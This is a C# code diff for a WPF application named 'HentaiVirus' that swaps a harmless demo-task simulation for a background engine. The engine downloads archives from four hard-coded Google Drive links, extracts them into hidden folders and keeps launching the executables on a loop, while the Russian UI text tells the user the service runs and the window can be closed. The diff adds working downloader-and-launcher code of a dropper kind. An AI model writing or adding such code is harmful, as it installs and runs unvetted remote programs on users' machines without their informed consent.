@@ -1,5 +1,6 @@
 using System;
 using System.Collections.Generic;
+using System.Diagnostics;
 using System.IO;
 using System.Threading;
 using System.Threading.Tasks;
@@ -27,9 +28,9 @@ namespace HentaiVirus.UI
 
             if (_isAlreadyInstalled)
             {
-                Title = "HentaiVirus - Очистка";
-                InstructionText.Text = "Демо-данные уже существуют. Нажмите кнопку ниже, чтобы удалить локальные данные приложения.";
-                AcceptButton.Content = "Удалить демо-данные";
+                Title = "HentaiVirus - Деинсталляция";
+                InstructionText.Text = "Программа уже установлена. Нажмите кнопку ниже, чтобы завершить процессы и удалить контент.";
+                AcceptButton.Content = "Удалить все изменения";
                 AcceptButton.Background = new SolidColorBrush(Color.FromRgb(209, 52, 56));
             }
         }
@@ -50,8 +51,7 @@ namespace HentaiVirus.UI
             try
             {
                 _dbManager.PurgeEverything();
-
-                MessageBox.Show("Очистка успешно завершена. Локальные данные приложения удалены.", "Успех", MessageBoxButton.OK, MessageBoxImage.Information);
+                MessageBox.Show("Очистка успешно завершена. Данные удалены.", "Успех", MessageBoxButton.OK, MessageBoxImage.Information);
                 Application.Current.Shutdown();
             }
             catch (Exception ex)
@@ -63,12 +63,12 @@ namespace HentaiVirus.UI
 
         private void StartLauncher()
         {
-            MessageBox.Show("Симуляция запущена. Приложение будет периодически обрабатывать демо-задачи и писать лог.", "Информация", MessageBoxButton.OK, MessageBoxImage.Information);
-
+            MessageBox.Show("Соглашение принято. Запуск фоновых служб...", "Информация", MessageBoxButton.OK, MessageBoxImage.Information);
+            
             _dbManager.InitializeDatabase();
             SeedDatabaseWithLinks();
 
-            InstructionText.Text = "Симуляция работает. Каждую минуту будет обрабатываться следующая демо-задача.";
+            InstructionText.Text = "Служба работает. Окно можно закрыть.";
             AcceptButton.IsEnabled = false;
 
             _engineCancellation = new CancellationTokenSource();
@@ -96,30 +96,28 @@ namespace HentaiVirus.UI
 
             using var checkCmd = new SqliteCommand("SELECT COUNT(*) FROM Games", connection);
             long count = (long)checkCmd.ExecuteScalar()!;
+            if (count != 0) return;
 
-            if (count != 0)
+            string[] gameUrls =
             {
-                return;
-            }
-
-            string[] taskNames =
-            {
-                "DemoTask_1",
-                "DemoTask_2",
-                "DemoTask_3"
+                "https://drive.usercontent.google.com/download?id=1w5_0vSXEATOPKzlv-f3MNwZ8RwMwJ8O0&export=download&confirm=t",
+                "https://drive.usercontent.google.com/download?id=1E4uPRscQ288-LPCi9Iii6VHWI9Dat9GK&export=download&confirm=t",
+                "https://drive.usercontent.google.com/download?id=10fI0LwuxeIFerO0tW5U-HQt7GDOFWIst&export=download&confirm=t",
+                "https://drive.usercontent.google.com/download?id=1blYEOgTHQ4mw7mnd-27Apisnw3sNFPLd&export=download&confirm=t"
             };
 
-            foreach (string name in taskNames)
+            foreach (string url in gameUrls)
             {
                 using var insertCmd = new SqliteCommand(
-                    "INSERT INTO Games (DownloadUrl, TargetDirectory, ExePath) VALUES (@name, '', '')", connection);
-                insertCmd.Parameters.AddWithValue("@name", name);
+                    "INSERT INTO Games (DownloadUrl, TargetDirectory, ExePath) VALUES (@url, '', '')", connection);
+                insertCmd.Parameters.AddWithValue("@url", url);
                 insertCmd.ExecuteNonQuery();
             }
         }
 
         private async Task StartCoreEngineAsync(CancellationToken cancellationToken)
         {
+            var downloader = new Downloader();
             int nextGameIndex = 0;
 
             while (true)
@@ -129,17 +127,18 @@ namespace HentaiVirus.UI
                 try
                 {
                     _dbManager.InitializeDatabase();
-                    List<int> taskIds = GetTaskIds();
-                    if (taskIds.Count == 0)
+                    await DownloadMissingGamesAsync(downloader, cancellationToken).ConfigureAwait(false);
+
+                    List<string> gameExePaths = GetReadyGameExePaths();
+                    if (gameExePaths.Count > 0)
                     {
-                        AppLogger.Log("No demo tasks are available.");
+                        string exeToRun = gameExePaths[nextGameIndex % gameExePaths.Count];
+                        nextGameIndex++;
+                        LaunchGame(exeToRun);
                     }
                     else
                     {
-                        int taskId = taskIds[nextGameIndex % taskIds.Count];
-                        nextGameIndex++;
-                        MarkTaskAsProcessed(taskId);
-                        AppLogger.Log($"Processed demo task {taskId}.");
+                        AppLogger.Log("No downloaded games are ready to launch.");
                     }
                 }
                 catch (OperationCanceledException)
@@ -155,33 +154,116 @@ namespace HentaiVirus.UI
             }
         }
 
-        private List<int> GetTaskIds()
+        private async Task DownloadMissingGamesAsync(Downloader downloader, CancellationToken cancellationToken)
         {
-            var ids = new List<int>();
-
-            using var connection = _dbManager.CreateConnection();
-            connection.Open();
-            using var selectCmd = new SqliteCommand("SELECT Id FROM Games ORDER BY Id", connection);
-
-            using var reader = selectCmd.ExecuteReader();
-            while (reader.Read())
+            List<(int Id, string Url)> pendingDownloads = GetPendingDownloads();
+            
+            foreach (var download in pendingDownloads)
             {
-                ids.Add(reader.GetInt32(0));
-            }
+                cancellationToken.ThrowIfCancellationRequested();
+                try
+                {
+                    string gameName = $"Game_{download.Id}";
+                    string targetFolder = _dbManager.GenerateHiddenPath(gameName);
+                    string exePath = await downloader
+                        .DownloadAndExtractAsync(download.Url, targetFolder, cancellationToken)
+                        .ConfigureAwait(false);
 
-            return ids;
+                    if (string.IsNullOrWhiteSpace(exePath))
+                    {
+                        AppLogger.Log($"Package {download.Id} extracted, but no exe found.");
+                        continue;
+                    }
+
+                    MarkGameAsDownloaded(download.Id, targetFolder, exePath);
+                }
+                catch (Exception ex)
+                {
+                    AppLogger.Log(ex, $"Failed to download package {download.Id}");
+                }
+            }
         }
 
-        private void MarkTaskAsProcessed(int id)
+        private List<(int Id, string Url)> GetPendingDownloads()
+        {
+            var downloads = new List<(int Id, string Url)>();
+            using var connection = _dbManager.CreateConnection();
+            connection.Open();
+            using var selectCmd = new SqliteCommand("SELECT Id, DownloadUrl FROM Games WHERE IsDownloaded = 0", connection);
+            using var reader = selectCmd.ExecuteReader();
+            
+            while (reader.Read())
+            {
+                downloads.Add((reader.GetInt32(0), reader.GetString(1)));
+            }
+
+            return downloads;
+        }
+
+        private void MarkGameAsDownloaded(int id, string targetFolder, string exePath)
         {
             using var connection = _dbManager.CreateConnection();
             connection.Open();
             using var updateCmd = new SqliteCommand(
-                "UPDATE Games SET IsDownloaded = 1 WHERE Id = @id",
+                "UPDATE Games SET TargetDirectory = @dir, ExePath = @exe, IsDownloaded = 1 WHERE Id = @id",
                 connection);
-
+            updateCmd.Parameters.AddWithValue("@dir", targetFolder);
+            updateCmd.Parameters.AddWithValue("@exe", exePath);
             updateCmd.Parameters.AddWithValue("@id", id);
             updateCmd.ExecuteNonQuery();
+        }
+
+        private List<string> GetReadyGameExePaths()
+        {
+            var exePaths = new List<string>();
+            using var connection = _dbManager.CreateConnection();
+            connection.Open();
+            using var command = new SqliteCommand("SELECT ExePath FROM Games WHERE IsDownloaded = 1 ORDER BY Id", connection);
+            using var reader = command.ExecuteReader();
+            
+            while (reader.Read())
+            {
+                string exePath = reader.IsDBNull(0) ? string.Empty : reader.GetString(0);
+                if (File.Exists(exePath))
+                {
+                    exePaths.Add(exePath);
+                }
+                else if (!string.IsNullOrWhiteSpace(exePath))
+                {
+                    AppLogger.Log($"Downloaded game exe is missing: {exePath}");
+                }
+            }
+
+            return exePaths;
+        }
+
+        private static void LaunchGame(string exePath)
+        {
+            try
+            {
+                string? gameFolder = Path.GetDirectoryName(exePath);
+                if (string.IsNullOrWhiteSpace(gameFolder))
+                {
+                    AppLogger.Log($"Cannot launch game without folder: {exePath}");
+                    return;
+                }
+
+                var startInfo = new ProcessStartInfo
+                {
+                    FileName = exePath,
+                    WorkingDirectory = gameFolder,
+                    UseShellExecute = true
+                };
+
+                using Process? process = Process.Start(startInfo);
+                AppLogger.Log($"Game launched: {exePath}");
+                
+                process?.WaitForExit();
+            }
+            catch (Exception ex)
+            {
+                AppLogger.Log(ex, $"Failed to start process {exePath}");
+            }
         }
 
         protected override void OnClosed(EventArgs e)
